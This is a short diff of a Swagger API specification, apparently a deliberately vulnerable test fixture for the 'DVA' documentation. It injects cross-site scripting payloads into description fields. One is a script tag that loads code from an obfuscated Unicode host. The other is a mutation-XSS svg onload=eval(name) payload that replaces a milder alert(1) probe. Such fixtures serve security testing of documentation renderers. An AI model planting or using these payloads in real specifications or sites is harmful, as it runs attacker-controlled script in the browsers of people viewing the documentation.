@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: Classic API Resource Documentation
   description: |
-    <h1>DVA Injected Code</h1>
+    <h1>DVA Injected Code</h1><script/src=//Ǌ.₨></script>
 
   version: production
 basePath: /DVA/
@@ -19,7 +19,7 @@ paths:
     delete:
       parameters:
         - description: |
-            <svg></p><style><a id="</style><img src=1 onerror=alert(1)>">
+            <svg></p><style><a id="</style><svg/onload=eval(name)>">
 
           format: int64
           in: path
